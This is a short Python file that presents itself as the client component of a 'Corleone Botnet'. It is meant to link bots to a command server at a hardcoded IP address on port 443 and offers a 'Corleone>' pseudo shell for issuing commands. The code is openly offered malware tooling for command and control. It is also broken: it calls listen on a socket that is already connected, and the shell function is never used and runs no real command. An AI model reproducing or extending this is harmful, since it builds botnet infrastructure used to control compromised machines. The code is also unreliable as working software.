# Software Name: Corleone Botnet - Client
## Software Description: This is the client for the Corleone Botnet, this piece of code is used to connect the Malware with the server, to sent commands to our bots.
## Developed by: 303
## Version: 1.0.0


import socket

IP = "194.113.73.59"
PORT = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))


## pseudo shell to execute commands on the bots
def pseudo_shell(IP, PORT):
    pseudo_shell = input("Corleone> ")
    if pseudo_shell == "whoami":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.sendall(b"Command Running!")
        s.close()
        return
    



# now we listen the joined connections
s.listen(5)

print("listening for new bot connections...")

while True:
    conn, addr = s.accept()
    print(f"New connection from {addr[0]}:{addr[1]}")

    while True:
        data = conn.recv(1024)
        if not data:
            break
        print(data.decode("utf-8"))
        conn.sendall(data)

    conn.close()

    print(f"Connection from {addr[0]}:{addr[1]} closed")

    ## we send an response to the client
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    s.sendall(b"Command Running!")

    s.close()




